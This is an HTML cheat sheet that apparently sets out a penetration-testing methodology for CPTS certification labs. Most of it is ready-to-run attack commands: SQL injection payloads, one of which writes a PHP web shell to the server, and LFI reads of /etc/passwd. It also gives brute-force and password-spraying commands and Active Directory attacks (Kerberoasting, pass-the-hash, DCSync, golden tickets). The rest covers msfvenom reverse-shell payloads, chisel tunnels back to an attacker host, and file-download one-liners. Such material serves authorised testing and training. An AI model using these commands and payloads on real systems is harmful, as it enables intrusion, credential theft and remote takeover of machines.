<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CPTS Methodology</title>
    <style>
        :root {
            --bg-color: #f4f7f6;
            --text-color: #333;
            --sidebar-bg: #1a252f;
            --sidebar-text: #ecf0f1;
            --accent-color: #3498db;
            --code-bg: #282c34;
            --code-text: #abb2bf;
            --phase1: #3498db; /* Prep */
            --phase2: #2ecc71; /* Network */
            --phase3: #e67e22; /* Services */
            --phase4: #9b59b6; /* Web */
            --phase5: #e74c3c; /* AD */
            --phase6: #1abc9c; /* Exploit */
            --phase7: #34495e; /* Post/Pivot */
            --phase8: #f1c40f; /* PrivEsc */
            --phase9: #7f8c8d; /* Reporting */
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            line-height: 1.5;
            color: var(--text-color);
            background-color: var(--bg-color);
            margin: 0;
            display: flex;
            height: 100vh;
        }

        /* Sidebar */
        nav {
            width: 260px;
            background: var(--sidebar-bg);
            color: var(--sidebar-text);
            height: 100%;
            display: flex;
            flex-direction: column;
            box-shadow: 2px 0 5px rgba(0,0,0,0.2);
            flex-shrink: 0;
            overflow-y: auto;
        }

        nav h2 {
            font-size: 1.4rem;
            margin: 0;
            padding: 20px;
            border-bottom: 1px solid #34495e;
            color: var(--accent-color);
            background: rgba(0,0,0,0.1);
        }

        nav ul {
            list-style: none;
            padding: 0;
            margin: 0;
        }

        nav ul li a {
            color: var(--sidebar-text);
            text-decoration: none;
            font-size: 0.95rem;
            display: block;
            padding: 12px 20px;
            border-left: 4px solid transparent;
            transition: all 0.2s;
        }

        nav ul li a:hover, nav ul li a.active {
            background: #2c3e50;
            border-left-color: var(--accent-color);
        }

        /* Color-code sidebar items */
        nav ul li:nth-child(1) a:hover { border-left-color: var(--phase1); }
        nav ul li:nth-child(2) a:hover { border-left-color: var(--phase2); }
        nav ul li:nth-child(3) a:hover { border-left-color: var(--phase3); }
        nav ul li:nth-child(4) a:hover { border-left-color: var(--phase4); }
        nav ul li:nth-child(5) a:hover { border-left-color: var(--phase5); }
        nav ul li:nth-child(6) a:hover { border-left-color: var(--phase6); }
        nav ul li:nth-child(7) a:hover { border-left-color: var(--phase7); }
        nav ul li:nth-child(8) a:hover { border-left-color: var(--phase8); }
        nav ul li:nth-child(9) a:hover { border-left-color: var(--phase9); }

        /* Main Content */
        main {
            flex: 1;
            padding: 30px 50px;
            overflow-y: auto;
            scroll-behavior: smooth;
        }

        .container {
            max-width: 1100px;
            margin: 0 auto;
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.05);
        }

        h1 { margin-top: 0; padding-bottom: 10px; border-bottom: 2px solid #eee; }
        
        .section-header {
            color: white;
            padding: 10px 15px;
            border-radius: 4px;
            margin-top: 40px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
        }
        
        .section-header h2 { margin: 0; font-size: 1.5rem; }
        .section-header .icon { margin-right: 10px; font-size: 1.2rem; }

        /* Phase Colors */
        .ph-1 { background: var(--phase1); }
        .ph-2 { background: var(--phase2); }
        .ph-3 { background: var(--phase3); }
        .ph-4 { background: var(--phase4); }
        .ph-5 { background: var(--phase5); }
        .ph-6 { background: var(--phase6); }
        .ph-7 { background: var(--phase7); }
        .ph-8 { background: var(--phase8); }
        .ph-9 { background: var(--phase9); }

        h3 {
            color: #2c3e50;
            border-bottom: 1px solid #eee;
            padding-bottom: 5px;
            margin-top: 30px;
        }

        .command-block {
            background: var(--code-bg);
            color: var(--code-text);
            padding: 15px;
            border-radius: 6px;
            font-family: 'Fira Code', 'Courier New', monospace;
            font-size: 0.9rem;
            margin: 10px 0;
            position: relative;
            overflow-x: auto;
        }

        .command-block code {
            display: block;
            white-space: pre;
        }
        
        .note {
            background: #e8f4fd;
            border-left: 4px solid var(--accent-color);
            padding: 10px 15px;
            margin: 15px 0;
            font-size: 0.95rem;
        }

        .warning {
            background: #fdeded;
            border-left: 4px solid #e74c3c;
            padding: 10px 15px;
            margin: 15px 0;
            font-size: 0.95rem;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            margin: 20px 0;
            font-size: 0.9rem;
        }
        th, td {
            border: 1px solid #ddd;
            padding: 8px 12px;
            text-align: left;
        }
        th { background-color: #f8f9fa; }
        
details {
            margin: 10px 0;
            background: #f9f9f9;
            border: 1px solid #eee;
            border-radius: 4px;
        }
        details summary {
            padding: 10px;
            cursor: pointer;
            font-weight: bold;
            color: #555;
        }
        details[open] summary { border-bottom: 1px solid #eee; }
        details .content { padding: 15px; }

        /* Syntax Highlighting Sim */
        .cmd-comment { color: #5c6370; font-style: italic; }
        .cmd-var { color: #e06c75; }
        .cmd-flag { color: #d19a66; }
    </style>
</head>
<body>

<nav>
    <h2>CPTS Methodology</h2>
    <ul>
        <li><a href="#prep">1. Prep &amp; Setup</a></li>
        <li><a href="#network">2. Network Enum</a></li>
        <li><a href="#services">3. Service Attacks</a></li>
        <li><a href="#web">4. Web Attacks</a></li>
        <li><a href="#ad">5. Active Directory</a></li>
        <li><a href="#exploitation">6. Exploitation</a></li>
        <li><a href="#post">7. Post-Exploitation</a></li>
        <li><a href="#privesc">8. PrivEsc</a></li>
        <li><a href="#reporting">9. Reporting</a></li>
    </ul>
</nav>

<main>
    <div class="container">
        <h1>Comprehensive Penetration Testing Methodology</h1>
        <p class="note"><strong>Goal:</strong> Structured, repeatable, and thorough assessment. "Distinguish between what we see and what we do not see."</p>

        <!-- PHASE 1 -->
        <div id="prep" class="section-header ph-1">
            <span class="icon">üõ†Ô∏è</span>
            <h2>Phase 1: Preparation &amp; Setup</h2>
        </div>
        <p>Optimize environment for efficiency and data capture.</p>
        
        <h3>1. Workspace &amp; Variables</h3>
        <div class="command-block">
            <code>export IP=10.129.x.x
export URL=http://$IP
mkdir -p {nmap,scans,exploits,loot,notes,downloads}
<span class="cmd-comment"># Use tmux/terminator for session management</span></code>
        </div>

        <h3>2. Mental Model (The Layers)</h3>
        <ul>
            <li><strong>External:</strong> Domains, ASN, Subdomains.</li>
            <li><strong>Perimeter:</strong> Firewalls, IDS/IPS, VPN.</li>
            <li><strong>Services:</strong> Ports, Versions, Tech Stack.</li>
            <li><strong>Internal:</strong> AD, Trusts, Network Segmentation.</li>
            <li><strong>Host:</strong> OS, Processes, Filesystem.</li>
        </ul>

        <!-- PHASE 2 -->
        <div id="network" class="section-header ph-2">
            <span class="icon">üó∫Ô∏è</span>
            <h2>Phase 2: Network Enumeration</h2>
        </div>
        
        <h3>1. Host Discovery</h3>
        <div class="command-block">
            <code><span class="cmd-comment"># Quick ping sweep</span>
fping -asgq 10.129.2.0/24

<span class="cmd-comment"># Nmap ping sweep</span>
sudo nmap -sn 10.129.2.0/24 -oA scans/discovery</code>
        </div>

        <h3>2. Port Scanning</h3>
        <div class="command-block">
            <code><span class="cmd-comment"># Full TCP Scan (The Standard)</span>
sudo nmap -p- -sS --min-rate 5000 --open -vvv -n -Pn $IP -oA scans/allports

<span class="cmd-comment"># UDP Scan (Crucial for SNMP/TFTP)</span>
sudo nmap -sU -F --top-ports 100 $IP -oA scans/udp_scan</code>
        </div>

        <h3>3. Service &amp; OS Detection</h3>
        <div class="command-block">
            <code><span class="cmd-comment"># Targeted scan on open ports</span>
ports=$(grep open scans/allports.nmap | awk -F/ '{print $1}' | tr '\n' ',' | sed 's/,$//')
sudo nmap -sC -sV -p $ports $IP -oA scans/detailed</code>
        </div>

        <!-- PHASE 3 -->
        <div id="services" class="section-header ph-3">
            <span class="icon">üîç</span>
            <h2>Phase 3: Service Footprinting</h2>
        </div>

        <details>
            <summary>FTP (21)</summary>
            <div class="content">
                <div class="command-block">
                    <code><span class="cmd-comment"># Anonymous Login</span>
wget -m --no-passive ftp://anonymous:anonymous@$IP

<span class="cmd-comment"># Brute Force</span>
hydra -l user -P /usr/share/wordlists/rockyou.txt ftp://$IP</code>
                </div>
            </div>
        </details>

        <details>
            <summary>SMB (139/445)</summary>
            <div class="content">
                <div class="command-block">
                    <code><span class="cmd-comment"># Enumeration</span>
smbclient -N -L //$IP
smbmap -H $IP
enum4linux-ng.py $IP -A

<span class="cmd-comment"># CrackMapExec (Check Null/Guest)</span>
crackmapexec smb $IP -u '' -p '' --shares
crackmapexec smb $IP -u 'guest' -p '' --shares

<span class="cmd-comment"># RID Cycling (Find Users)</span>
crackmapexec smb $IP -u 'guest' -p '' --rid-brute</code>
                </div>
            </div>
        </details>

        <details>
            <summary>NFS (111/2049)</summary>
            <div class="content">
                <div class="command-block">
                    <code>showmount -e $IP
mkdir mnt
sudo mount -t nfs $IP:/share ./mnt -o nolock
<span class="cmd-comment"># Check for Root Squashing (upload SUID binary)</span></code>
                </div>
            </div>
        </details>

        <details>
            <summary>DNS (53)</summary>
            <div class="content">
                <div class="command-block">
                    <code><span class="cmd-comment"># Zone Transfer</span>
dig axfr domain.htb @$IP
host -l domain.htb $IP

<span class="cmd-comment"># Enum</span>
dnsenum --enum domain.htb -f subdomains.txt</code>
                </div>
            </div>
        </details>

        <details>
            <summary>Databases (SQL)</summary>
            <div class="content">
                <div class="command-block">
                    <code><span class="cmd-comment"># MySQL</span>
mysql -u root -p -h $IP <span class="cmd-comment"># Try empty pass</span>

<span class="cmd-comment"># MSSQL (Impacket)</span>
impacket-mssqlclient User:Pass@$IP -windows-auth
SQL&gt; enable_xp_cmdshell
SQL&gt; xp_cmdshell whoami</code>
                </div>
            </div>
        </details>

        <!-- PHASE 4 -->
        <div id="web" class="section-header ph-4">
            <span class="icon">üåê</span>
            <h2>Phase 4: Web Enumeration &amp; Attacks</h2>
        </div>

        <h3>1. Reconnaissance</h3>
        <div class="command-block">
            <code>whatweb $IP
curl -I http://$IP
<span class="cmd-comment"># Tech stack? CMS? Headers?</span></code>
        </div>

        <h3>2. Fuzzing (VHost &amp; Directory)</h3>
        <div class="command-block">
            <code><span class="cmd-comment"># VHosts (CRITICAL)</span>
ffuf -u http://$IP -H "Host: FUZZ.domain.htb" -w subdomains.txt -fs [size]

<span class="cmd-comment"># Directories</span>
ffuf -u http://$IP/FUZZ -w common.txt -e .php,.txt,.html,.js</code>
        </div>

        <h3>3. Specific Attacks</h3>
        <details>
            <summary>SQL Injection</summary>
            <div class="content">
                <ul>
                    <li><strong>Auth Bypass:</strong> <code>admin' or '1'='1</code>, <code>admin')-- -</code></li>
                    <li><strong>Union:</strong> <code>' UNION SELECT 1,2,3,4-- -</code></li>
                    <li><strong>File Read:</strong> <code>' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3-- -</code></li>
                    <li><strong>File Write:</strong> <code>' UNION SELECT "&lt;?php system(\"
$_GET[\'cmd\']\");?&gt;" INTO OUTFILE '/var/www/html/shell.php'-- -</code></li>
                </ul>
            </div>
        </details>

        <details>
            <summary>LFI / RCE</summary>
            <div class="content">
                <ul>
                    <li><strong>Basic:</strong> <code>?page=../../../../etc/passwd</code></li>
                    <li><strong>Wrappers:</strong> <code>php://filter/convert.base64-encode/resource=index.php</code></li>
                    <li><strong>Log Poisoning:</strong> Inject PHP code into User-Agent, access <code>/var/log/apache2/access.log</code> via LFI.</li>
                </ul>
            </div>
        </details>

        <!-- PHASE 5 -->
        <div id="ad" class="section-header ph-5">
            <span class="icon">üè¢</span>
            <h2>Phase 5: Active Directory</h2>
        </div>

        <h3>1. No Credentials</h3>
        <div class="command-block">
            <code><span class="cmd-comment"># Poisoning</span>
sudo responder -I tun0 -dwv

<span class="cmd-comment"># User Enum</span>
kerbrute userenum -d domain.local --dc $IP users.txt

<span class="cmd-comment"># AS-REP Roasting (No-Auth)</span>
impacket-GetNPUsers domain/ -usersfile users.txt -format hashcat -outputfile asrep.hashes</code>
        </div>

        <h3>2. With User Credentials</h3>
        <div class="command-block">
            <code><span class="cmd-comment"># Bloodhound (The Map)</span>
bloodhound-python -u 'user' -p 'pass' -ns $IP -d domain.local -c all

<span class="cmd-comment"># Password Spraying</span>
crackmapexec smb $IP -u users.txt -p 'Password123' --continue-on-success

<span class="cmd-comment"># Kerberoasting</span>
impacket-GetUserSPNs domain.local/user:pass -dc-ip $IP -request

<span class="cmd-comment"># Enumeration</span>
rpcclient -U "user%pass" $IP
ldapsearch -x -H ldap://$IP -D "user@domain" -w "pass" -b "DC=domain,DC=local"</code>
        </div>

        <h3>3. Attacks &amp; Lateral Movement</h3>
        <div class="command-block">
            <code><span class="cmd-comment"># Pass-the-Hash</span>
impacket-psexec domain/user@$IP -hashes :nthash
evil-winrm -i $IP -u user -H nthash

<span class="cmd-comment"># DCSync (Domain Admin)</span>
impacket-secretsdump domain/user:pass@$IP

<span class="cmd-comment"># Silver/Golden Tickets</span>
impacket-ticketer -nthash &lt;hash&gt; -domain-sid &lt;sid&gt; -domain domain.local administrator</code>
        </div>

        <!-- PHASE 6 -->
        <div id="exploitation" class="section-header ph-6">
            <span class="icon">üí£</span>
            <h2>Phase 6: Exploitation</h2>
        </div>

        <h3>Payloads (MSFVenom)</h3>
        <div class="command-block">
            <code><span class="cmd-comment"># Windows</span>
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f exe -o shell.exe
<span class="cmd-comment"># Linux</span>
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$IP LPORT=443 -f elf -o shell.elf
<span class="cmd-comment"># Web</span>
msfvenom -p php/reverse_php LHOST=$IP LPORT=443 -f raw &gt; shell.php</code>
        </div>

        <h3>Shell Stabilization</h3>
        <div class="command-block">
            <code>python3 -c 'import pty; pty.spawn("/bin/bash")'
<span class="cmd-comment"># Ctrl+Z</span>
stty raw -echo; fg
export TERM=xterm</code>
        </div>

        <!-- PHASE 7 -->
        <div id="post" class="section-header ph-7">
            <span class="icon">üöá</span>
            <h2>Phase 7: Post-Exploitation &amp; Pivoting</h2>
        </div>

        <h3>Pivoting Tools</h3>
        <div class="command-block">
            <code><span class="cmd-comment"># SSH Dynamic (SOCKS)</span>
ssh -D 9050 user@pivot

<span class="cmd-comment"># Chisel (Reverse SOCKS)</span>
(Attacker) ./chisel server -p 8000 --reverse
(Victim)   ./chisel client $ATTACKER:8000 R:socks

<span class="cmd-comment"># Sshuttle (VPN-like)</span>
sshuttle -r user@pivot 172.16.x.x/24</code>
        </div>

        <h3>File Transfers</h3>
        <div class="command-block">
            <code><span class="cmd-comment"># Windows</span>
iwr -uri http://$IP/file.exe -OutFile file.exe
certutil -urlcache -split -f http://$IP/file.exe

<span class="cmd-comment"># Linux</span>
wget http://$IP/file
curl http://$IP/file -o file</code>
        </div>

        <!-- PHASE 8 -->
        <div id="privesc" class="section-header ph-8">
            <span class="icon">‚¨ÜÔ∏è</span>
            <h2>Phase 8: Privilege Escalation</h2>
        </div>

        <div style="display: flex; gap: 20px;">
            <div style="flex: 1;">
                <h3>Linux</h3>
                <ul>
                    <li><code>sudo -l</code></li>
                    <li><code>find / -perm -4000 2&gt;/dev/null</code> (SUID)</li>
                    <li><code>getcap -r / 2&gt;/dev/null</code></li>
                    <li><code>ps -aux | grep root</code></li>
                    <li><code>cat /etc/crontab</code></li>
                    <li><strong>Tool:</strong> <code>linpeas.sh</code></li>
                </ul>
            </div>
            <div style="flex: 1;">
                <h3>Windows</h3>
                <ul>
                    <li><code>whoami /priv</code> (SeImpersonate?)</li>
                    <li><code>whoami /groups</code></li>
                    <li><code>cmdkey /list</code> (Saved creds?)</li>
                    <li><code>wmic service get name,pathname,startmode</code></li>
                    <li><strong>Tool:</strong> <code>winPEASx64.exe</code></li>
                </ul>
            </div>
        </div>

        <!-- PHASE 9 -->
        <div id="reporting" class="section-header ph-9">
            <span class="icon">üìù</span>
            <h2>Phase 9: Reporting</h2>
        </div>
        <ul>
            <li><strong>Evidence:</strong> Screenshot every flag and critical step.</li>
            <li><strong>Cleanup:</strong> Remove all tools, shells, and user accounts created.</li>
            <li><strong>Note:</strong> Keep raw logs of scans for appendix.</li>
        </ul>

    </div>
</main>

</body>
</html>